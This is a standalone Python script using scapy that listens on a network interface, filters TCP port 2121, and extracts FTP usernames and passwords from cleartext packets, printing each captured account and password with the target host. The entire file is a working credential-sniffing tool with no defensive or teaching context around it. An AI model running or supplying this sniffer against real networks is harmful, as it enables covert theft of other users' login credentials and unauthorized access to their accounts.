#!/usr/bin/python

import optparse
import re
from scapy.all import *

def ftpsniff(pkt):
    try:
        dest = pkt[IP].dst
        dest = str(dest)
        raw = pkt.sprintf('%Raw.Load%')
        user = re.findall('(?i)USER (.*)', raw)
        passwd = re.findall('(?i)PASS (.*)', raw)
        if user:
            print(f'[+] Detected login to {dest}')
            print(f'[+] User Account is: {user[0]}')
        elif passwd:
            print(f'[+] Password is: {passwd[0]}')
    except Exception as e:
        print(f"Error: {e}")

def main():
    parser = optparse.OptionParser('usage of the program: ' + '-i <interface>')
    parser.add_option('-i', dest='interface', type='string', help='Specify the interface to listen on')
    (options, args) = parser.parse_args()
    if options.interface is None:
        print(parser.usage)
        exit(0)
    else:
        conf.iface = options.interface
    try:
        sniff(filter='tcp port 2121', prn=ftpsniff)
    except KeyboardInterrupt:
        print("Exiting...")
        exit(0)

if __name__ == "__main__":
    main()
